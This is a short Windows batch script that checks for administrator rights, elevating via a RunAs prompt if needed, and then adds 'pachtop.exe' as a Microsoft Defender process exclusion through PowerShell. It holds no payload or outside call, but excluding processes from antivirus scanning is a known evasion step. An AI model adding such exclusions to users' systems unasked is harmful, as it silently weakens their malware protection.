@echo off
:: Check if the script is running with administrator privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    :: If the script is running as administrator, run the PowerShell command
    powershell -Command Add-MpPreference -ExclusionProcess "pachtop.exe"
) else (
    
    powershell -Command "Start-Process cmd -ArgumentList '/c \"powershell -Command Add-MpPreference -ExclusionProcess \"\"pachtop.exe\"\"\"' -Verb RunAs"
)
